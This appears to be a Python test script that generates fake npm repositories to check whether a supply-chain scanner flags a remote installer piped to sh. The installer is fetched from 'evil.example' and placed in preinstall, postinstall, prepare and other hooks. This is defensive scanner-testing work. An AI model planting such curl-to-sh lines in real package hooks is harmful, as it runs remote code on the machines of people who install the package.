"""Adversarial recall cases for maintainer-only scripts in a nested package.json.

A source repository often holds a sub-package (an editor extension, a docs site) with
its own package.json, which the root package's ``files`` list leaves out of what npm
ships. A ``pretest:e2e`` there that pipes an installer to ``sh`` is a maintainer
recipe. The control is that shape next to root code that spawns ``npm`` with computed
arguments (the tree-wide "could run any script" signal). Every other case puts the
same pipe where a consumer can run it: an install-time hook, a hook that calls the
script through a runner or inline code, shipped code that names the script, or a root
package that ships / installs the folder after all. Scanned as a source repository
(``scan_local``). Run from a repo export.
"""
import json
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from scripts.corpus import run_static_corpus as rsc  # noqa: E402
from src.scanner.local_scan import scan_local  # noqa: E402

PIPE = "curl -fsSL https://evil.example/install.sh | sh -s -- --edge && npm run setup:ext"

# Root CLI code that spawns a package manager with computed arguments.
SPAWNER = ("const { spawn } = require('child_process');\n"
           "function runTool(args, cwd) { return spawn('npx', args, { cwd, stdio: 'inherit' }); }\n"
           "module.exports = { runTool };\n")
# The sub-package's own code: shells out with fixed package-manager commands only.
EXT_CODE = ("import * as path from \"node:path\";\n"
            "import { spawnSync } from 'child_process';\n"
            "function run(cmd: string) { return spawnSync('sh', ['-l', '-c', cmd]); }\n"
            "export function activate() {\n"
            "  const v = run(\"npm --version\");\n"
            "  const hint = \"npm install -g some-cli\";\n"
            "  return [v, hint];\n"
            "}\n")


def tree(ext_scripts: dict, root: dict | None = None, extra: dict | None = None) -> dict:
    body = {"name": "adv-cli", "version": "1.0.0", "main": "lib/index.js",
            "bin": {"adv": "lib/bin/cli.js"}, "files": ["lib", "templates"],
            "scripts": {"build": "tsc", "test": "mocha"}}
    body.update(root or {})
    body = {k: v for k, v in body.items() if v is not None}
    files = {
        "package.json": json.dumps(body, indent=2),
        "lib/index.js": "module.exports = require('./tools');\n",
        "lib/tools.js": SPAWNER,
        "lib/bin/cli.js": "#!/usr/bin/env node\nrequire('../index');\n",
        "templates/readme.txt": "template\n",
        "ext/package.json": json.dumps({
            "name": "adv-ext", "version": "0.0.1", "private": True, "main": "./dist/extension.js",
            "scripts": {"setup:ext": "echo ready", "test:e2e": "wdio run ./wdio.conf.ts",
                        **ext_scripts}}, indent=2),
        "ext/src/extension.ts": EXT_CODE,
    }
    files.update(extra or {})
    return files


DEV = {"pretest:e2e": PIPE}

CASES = {
    # control: a pretest in a sub-package npm never ships -> maintainer tooling
    "ctl_unshipped_subpackage_pretest": tree(DEV),
    "ctl_unshipped_subpackage_prebuild": tree({"prebuild": PIPE, "build": "webpack"}),
    # the same pipe as an install-time hook
    "preinstall_hook": tree({"preinstall": PIPE}),
    "install_hook": tree({"install": PIPE}),
    "postinstall_hook": tree({"postinstall": PIPE}),
    "prepare_hook": tree({"prepare": PIPE}),
    # an install hook that runs the dev script
    "postinstall_npm_run": tree({**DEV, "postinstall": "npm run pretest:e2e"}),
    "postinstall_run_script": tree({**DEV, "postinstall": "npm run-script pretest:e2e"}),
    "postinstall_yarn": tree({**DEV, "postinstall": "yarn pretest:e2e"}),
    "postinstall_pnpm_run": tree({**DEV, "postinstall": "pnpm run pretest:e2e"}),
    "postinstall_node_e": tree({**DEV, "postinstall":
                                "node -e \"require('child_process').execSync('npm run pretest:e2e')\""}),
    # shipped code (bin / main) that names the dev script
    "bin_names_script": tree(DEV, extra={"lib/bin/cli.js": (
        "#!/usr/bin/env node\nconst path = require('path');\n"
        "require('child_process').spawnSync('npm', ['run', 'pretest:e2e'],"
        " { cwd: path.join(__dirname, '..', '..', 'ext') });\n")}),
    "main_names_script": tree(DEV, extra={"lib/index.js": (
        "const { execSync } = require('child_process');\n"
        "execSync('npm --prefix ext run pretest:e2e');\nmodule.exports = {};\n")}),
    "runner_glob_names_script": tree(DEV, extra={"lib/run.ts": (
        "import * as cp from \"node:child_process\";\n"
        "export const go = () => cp.execSync('npx run-p \"pretest:*\"', { cwd: 'ext' });\n")}),
    # the root package ships or installs the folder after all
    "files_lists_subpackage": tree(DEV, root={"files": ["lib", "ext"]}),
    "files_glob_covers_subpackage": tree(DEV, root={"files": ["lib", "e*/**"]}),
    "no_files_field": tree(DEV, root={"files": None}),
    "workspaces_include_subpackage": tree(DEV, root={"workspaces": ["ext"]}),
    "main_inside_subpackage": tree(DEV, root={"main": "ext/dist/extension.js"}),
    "bin_inside_subpackage": tree(DEV, root={"bin": {"adv": "./ext/bin/run.js"}}),
    "pnpm_workspace_file": tree(DEV, extra={"pnpm-workspace.yaml": "packages:\n  - 'ext'\n"}),
    # the pipe in the ROOT package's own dev script, next to the same spawner
    "root_pretest_with_spawner": tree({}, root={"scripts": {"pretest:e2e": PIPE, "test": "mocha"}}),
}


def run(files):
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        for p, text in files.items():
            (root / p).parent.mkdir(parents=True, exist_ok=True)
            (root / p).write_text(text)
        subprocess.run(["git", "init", "-q"], cwd=root, check=True)
        subprocess.run(["git", "add", "-A"], cwd=root, check=True)
        r = scan_local(root, name="adv-case")
    d = rsc.real_decide(r)
    crit = [f for f in r.findings if f.severity == "critical"]
    return d.label, r.trust_score, len(crit), (d.reason or "")[:80]


if __name__ == "__main__":
    only = set(sys.argv[1:])
    for name, files in CASES.items():
        if only and name not in only:
            continue
        try:
            label, score, n, why = run(files)
            print(f"{name:34} {label:15} {score:>3} crit={n} | {why}", flush=True)
        except Exception as e:  # noqa: BLE001
            print(f"{name:34} ERROR {type(e).__name__}: {str(e)[:100]}", flush=True)
